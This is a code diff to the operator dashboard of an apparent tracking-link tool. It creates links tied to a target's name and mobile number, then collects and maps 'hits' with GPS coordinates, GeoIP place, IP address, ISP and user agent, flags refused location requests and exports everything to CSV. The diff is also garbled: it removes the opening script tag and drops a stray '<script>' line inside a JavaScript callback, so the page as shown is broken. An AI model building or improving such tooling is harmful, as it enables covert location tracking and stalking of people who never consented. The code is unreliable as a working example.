@@ -146,8 +146,6 @@ tr.exp-row td{background:#0e1220;font-size:12.5px;color:var(--dim);padding:12px 
     </section>
   </div>
 </main>
-
-<script>
 const token = new URLSearchParams(location.search).get('token');
 const q = token ? '?token=' + token : '';
 
@@ -161,20 +159,13 @@ L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&
 
 /* ---------- helpers ---------- */
 async function api(path, opts={}){
-  try {
-    const r = await fetch(path+q,{headers:{'Content-Type':'application/json'},...opts});
-    if(!r.ok) {
-      let errMsg = 'request failed';
-      try { const err = await r.json(); errMsg = err.error || errMsg; } catch(_) {}
-      throw new Error(errMsg);
-    }
-    return r.json();
-  } catch(e) {
-    if(e instanceof TypeError && e.message.includes('fetch')) {
-      throw new Error('Network error: unable to reach server');
-    }
-    throw e;
+  const r = await fetch(path+q,{headers:{'Content-Type':'application/json'},...opts});
+  if(!r.ok) {
+    let errMsg = 'request failed';
+    try { const err = await r.json(); errMsg = err.error || errMsg; } catch(_) {}
+    throw new Error(errMsg);
   }
+  return r.json();
 }
 const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 const timeAgo = iso => { const s=(Date.now()-new Date(iso))/1000;
@@ -185,26 +176,24 @@ const mapsLink = (lat,lng) => {
   if(lat==null||lng==null||isNaN(lat)||isNaN(lng)) return '';
   return `<a class="mapslink" target="_blank" href="https://www.google.com/maps?q=${lat},${lng}">Google Maps ↗</a>`;
 };
-const typePill = h => h.gps && typeof h.gps === 'object' ? '<span class="pill gps">GPS</span>'
+const typePill = h => h.gps && typeof h.gps==='object' ? '<span class="pill gps">GPS</span>'
   : h.source==='denied' ? '<span class="pill denied">DENIED</span>'
   : h.geoip ? '<span class="pill ip">IP</span>' : '<span class="pill none">—</span>';
 const colorOf = id => { const i=targets.findIndex(t=>t.id===id); return COLORS[Math.max(0,i)%COLORS.length]; };
+const safeHits = t => Array.isArray(t.hits) ? t.hits : [];
 
-/* helper: safe coordinate extraction */
 function getCoords(h) {
   if (!h) return null;
-  if (h.gps && typeof h.gps === 'object' && h.gps !== null) {
-    const lat = Number(h.gps.lat), lng = Number(h.gps.lng);
-    if (!isNaN(lat) && !isNaN(lng)) return { lat, lng, type:'gps', accuracy: h.gps.accuracy };
+  if (h.gps && typeof h.gps==='object') {
+    const lat=Number(h.gps.lat), lng=Number(h.gps.lng);
+    if(!isNaN(lat) && !isNaN(lng)) return {lat,lng,type:'gps',accuracy:h.gps.accuracy};
   }
-  if (h.geoip && typeof h.geoip === 'object' && h.geoip !== null) {
-    const lat = Number(h.geoip.lat), lng = Number(h.geoip.lon);
-    if (!isNaN(lat) && !isNaN(lng)) return { lat, lng, type:'geoip' };
+  if (h.geoip && typeof h.geoip==='object') {
+    const lat=Number(h.geoip.lat), lng=Number(h.geoip.lon);
+    if(!isNaN(lat) && !isNaN(lng)) return {lat,lng,type:'geoip'};
   }
   return null;
 }
-
-function safeHits(t) { return Array.isArray(t.hits) ? t.hits : []; }
 
 setInterval(()=>{ $('clock').textContent=new Date().toLocaleTimeString(); },1000);
 
@@ -214,11 +203,25 @@ async function createTarget(){
   if(!name||!mobile){ $('formMsg').textContent='Fill in both fields.'; return; }
   $('formMsg').textContent='';
   try{
-    const {link}=await api('/api/targets',{method:'POST',body:JSON.stringify({name,mobile})});
+    const {target,link}=await api('/api/targets',{method:'POST',body:JSON.stringify({name,mobile})});
     $('genLink').value=link; $('linkRow').style.display='flex';
     $('inpName').value=''; $('inpMobile').value='';
-    await refreshAll();
-  }catch(e){ $('formMsg').textContent=e.message; }
+
+    // Inject the new target into local state immediately
+    // so the list updates without waiting for the 3s poll
+    if(target && target.id) {
+      target.hits = target.hits || [];
+      targets.push(target);
+      renderAll();
+    } else {
+      // No target object in response — refresh from server
+      await refreshAll();
+    }
+  }catch(e){
+    $('formMsg').textContent=e.message;
+    // Do NOT call refreshAll here — the POST genuinely failed,
+    // no point reloading stale-or-empty state
+  }
 }
 async function copyText(id,btn){
   const v=$(id).value;
@@ -293,6 +296,7 @@ function renderHits(){
       <div style="margin-top:6px">UA: <span class="mono">${esc(h.ua||'—')}</span></div>
       <div class="mono" style="margin-top:4px;color:#5a6279">${new Date(h.ts).toLocaleString()}</div>
     </td></tr>`;
+    <script>
   }).join('');
   $('hitRows').innerHTML = rows || `<tr><td colspan="6" class="empty">No hits recorded yet.</td></tr>`;
 }
@@ -332,13 +336,15 @@ function renderLegend(){
 
 /* ---------- data + live loop ---------- */
 async function loadData(){
-  targets = await api('/api/targets');
-  targets.forEach(t=>{
-    const tHits = safeHits(t);
-    const last = [...tHits].reverse().find(h=>h.place);
-    t.lastPlace = last ? last.place : null;
-  });
-  hits = await api('/api/locations');
+  // Atomic: only replace state if ALL requests succeed
+  const [freshTargets, freshHits] = await Promise.all([
+    api('/api/targets'),
+    api('/api/locations')
+  ]);
+  targets = freshTargets;
+  hits = freshHits;
+  // Mark all as known so only genuinely new hits flash next cycle
+  hits.forEach(h => known.add(h.id));
 }
 
 function renderAll(){
@@ -353,8 +359,14 @@ function renderAll(){
   f.innerHTML='<option value="">All targets</option>'+targets.map(t=>`<option value="${t.id}">${esc(t.name)}</option>`).join('');
   f.value=prev;
 
+  // Recompute lastPlace for each target from embedded hits
+  targets.forEach(t=>{
+    const tHits = safeHits(t);
+    const last = [...tHits].reverse().find(h=>h.place);
+    t.lastPlace = last ? last.place : null;
+  });
+
   renderTargets(); renderHits(); renderMap(); renderLegend();
-  hits.forEach(h=>known.add(h.id));
 }
 
 function animate(el,val){
@@ -369,7 +381,15 @@ function animate(el,val){
   requestAnimationFrame(step);
 }
 
-async function refreshAll(){ try{ await loadData(); renderAll(); }catch(e){ console.error(e); } }
+async function refreshAll(){
+  try{
+    await loadData();
+    renderAll();
+  }catch(e){
+    console.error('refreshAll failed — state unchanged:', e);
+    // targets/hits are NOT overwritten, UI keeps showing last good state
+  }
+}
 
 function exportCSV(){
   const rows=[['time','target','mobile','type','place','lat','lng','accuracy_m','ip','isp','ua']];
@@ -389,10 +409,9 @@ function exportCSV(){
 
 /* start */
 (async function init(){
-  try{ await loadData(); hits.forEach(h=>known.add(h.id)); }catch(e){ console.error(e); }
-  renderAll();
+  try{ await refreshAll(); }catch(e){ console.error(e); }
   setInterval(refreshAll,3000);
 })();
-</script>
+    </script>
 </body>
 </html>
